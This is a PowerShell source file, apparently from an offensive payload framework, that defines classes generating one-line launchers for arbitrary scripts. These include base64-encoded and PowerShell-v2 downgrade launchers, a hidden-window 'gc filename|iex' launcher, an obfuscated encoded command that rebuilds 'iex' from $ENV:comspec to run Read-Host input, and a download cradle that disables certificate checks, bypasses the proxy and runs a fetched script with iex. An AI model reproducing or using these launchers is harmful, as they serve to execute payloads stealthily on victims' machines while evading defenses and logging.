#############------------LAINCHERS---------------------------
class Launcher{
	[string]getName(){
		return ""
	}
	[string]getRunStr([string] $source){
		return ""
	}
	[string]getSource([string] $source){
		return ""
	}
   static  [string] encodeBase64($text){
		try{
	$Bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
	$EncodedText =[Convert]::ToBase64String($Bytes)
		return $EncodedText
			}catch{
				$ErrorMessage = $_.Exception.Message
				Write-Error $ErrorMessage

			return ""
			}
	}
	static 	[string] decodeBase64($text){
			try{return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($text))}
			catch{
				$ErrorMessage = $_.Exception.Message
				
				Write-Error $ErrorMessage
			return ""
			}
	}
}
class Launche_Base64:Launcher{
		
		
		[string]getPref(){
		return "powershell -sta -noP -e ";
		}

		[string]getName(){
		return $this.getPref()+ "<Base64>"
		}

		[string]getRunStr([string] $source){
			$res = [Launcher]::encodeBase64($source)
			$res = $this.getPref()+$res
		return $res
		}

		[string]getSource([string] $source){
			if ($source -ne $null){
			if ($source.Length  -ge $this.getPref().Length){
				$pr = $source.Substring(0,$this.getPref().Length)
				if ($pr -eq $this.getPref()){
					$res = $source.Substring($this.getPref().Length, $source.Length-$this.getPref().Length)
					$res = [Launcher]::decodeBase64($res)	
					return $res
					}
				}
			}
			return [Launcher]::decodeBase64($source)	 
		}
	}
class Launche_Base64psV2:Launche_Base64{
			[string]getPref(){
			return "powershell -ver 2 -sta -noP -enc ";
			}
}
class Launche_STDIN:Launcher{
		
		
		[string]getPref(){
		return "powershell -sta -noP -e ";
		}

		[string]getName(){
		return "powershell WAIT STDIN one line ScriptBlock (max 8190)"
		}

		[string]getRunStr([string] $source){
				$res = "powershell -sta -noP -e LgAoACAAJAB7AEUATgBWADoAYwBgAG8AYABNAGAAUwBwAEUAYwB9AFsANAAsADIANAAsADIANQBdAC0AagBPAEkAbgAnACcAKQAoACYAKAAiAHsAMAB9AHsAMQB9ACIALQBmACcAUgBlAGEAZAAnACwAJwAtAEgAbwBzAHQAJwApACkADQAKAA0ACgA="
		return $res
		}

		[string]getSource([string] $source){
			if ($source -ne $null){
			if ($source.Length -gt $this.getPref().Length){
				$pr = $source.Substring(0,$this.getPref().Length)
				if ($pr -eq $this.getPref()){
					$res = $source.Substring($this.getPref().Length, $source.Length-$this.getPref().Length)
					$res = [Launcher]::decodeBase64($res)	
					return $res
					}
				}
			}
			return [Launcher]::decodeBase64($source)	 
		}
	}
class Launche_Command:Launcher{
		
		
		[string]getPref(){
		return "powershell -sta -noP -c ";
		}

		[string]getName(){
		return $this.getPref()+ "<command>"
		}

		[string]getRunStr([string] $source){
			
			$source = $source.Replace("`n","")
			$source = $source.Replace("`r","")
			$res ='"'+$source+'"'
			$res = $this.getPref()+$res
		return $res
		}

		[string]getSource([string] $source){
			if ($source -ne $null){
			if ($source.Length  -ge $this.getPref().Length){
				$pr = $source.Substring(0,$this.getPref().Length+1)
				if ($pr -eq $this.getPref()){
					$res = $source.Substring($this.getPref().Length, $source.Length-$this.getPref().Length-1)
					return $res
					}
				}
			}
			return [Launcher]::decodeBase64($source)	 
		}
	}
class Launche_File:Launcher{
		
		
		[string]getPref(){
		return "powershell -w hidden -sta -noP -c ";
		}

		[string]getName(){
		return $this.getPref()+ '"gc filename|iex"'
		}

		[string]getRunStr([string] $source){
			$res = $this.getName()
		return $res
		}

		[string]getSource([string] $source){
			return $source
		}
	}
class Launche_WebDownload:Launcher{
		
		[string]getPref(){
		return "powershell -sta -noP -c ";
		}

		[string]getName(){
			$res = '$url = '+"'http://localhost'"+';$wc = New-Object System.Net.WebClient ; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy(); ($wc.DownloadString($url) | iex)'
		return $this.getPref()+ $res
		}

		[string]getRunStr([string] $source){
			
			$res = $this.getName()
		return $res
		}

		[string]getSource([string] $source){
			return $source	 
		}

}
#############------------LAINCHERS---------------------------

class LauncherStorage{
		[Collections.Generic.LinkedList[Launcher]] $LauncherList = [Collections.Generic.LinkedList[Launcher]]::new()
		LauncherStorage(){
			$this.registration()
		}
		[void] registration(){
		[Launche_Base64] $trs = [Launche_Base64]::new()
			$this.LauncherList.Add($trs)

		[Launche_Base64psV2] $trs = [Launche_Base64psV2]::new()
			$this.LauncherList.Add($trs)
		[Launche_Command] $trs = [Launche_Command]::new()
			$this.LauncherList.Add($trs)
		[Launche_File] $trs = [Launche_File]::new()
			$this.LauncherList.Add($trs)
		[Launche_STDIN] $trs = [Launche_STDIN]::new()
			$this.LauncherList.Add($trs)
		[Launche_WebDownload] $trs = [Launche_WebDownload]::new()
			$this.LauncherList.Add($trs)
			
		}

		[Launcher] getLauncherbyName([string]$lname){ 
			ForEach($s in $this.LauncherList){
			if ($s.getName() -eq $lname){
				return $s	
					}
				}
			return $null
		}
}
